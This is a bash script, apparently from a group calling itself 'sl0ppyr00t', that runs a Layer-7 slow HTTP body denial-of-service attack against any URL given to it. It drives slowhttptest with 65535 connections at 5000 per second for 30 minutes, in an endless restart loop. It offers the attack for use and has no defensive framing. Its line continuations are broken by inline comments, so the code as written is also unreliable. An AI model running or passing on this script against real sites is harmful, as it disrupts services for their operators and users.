#!/bin/bash
#
# Enhanced Sl0ppy - l7-body
# Team sl0ppyr00t
# x0xr00t

# Validate URL input
if [[ -z "$1" ]]; then
    echo "Usage: $0 <URL>"
    exit 1
fi

url="$1"

# Function to execute the slow body attack
function run_slowhttptest {
    echo "[*] Initiating slow HTTP body attack against $url..."

    slowhttptest \
        -B \                       # Body attack
        -u "$url" \                # Target URL
        -c 65535 \                 # Concurrent connections
        -r 5000 \                  # Connections per second
        -k 20 \                    # Keep-alive requests per connection
        -p 50 \                    # Seconds to wait before sending body data
        -m accept \                # Accept HTTP body response
        -l 1800 \                  # Duration in seconds (30 minutes)
        --no-progress-bar
}

# Infinite loop to repeat the test
while true; do
    run_slowhttptest
    echo "[*] Test iteration completed. Restarting in 5 seconds..."
    sleep 5
done
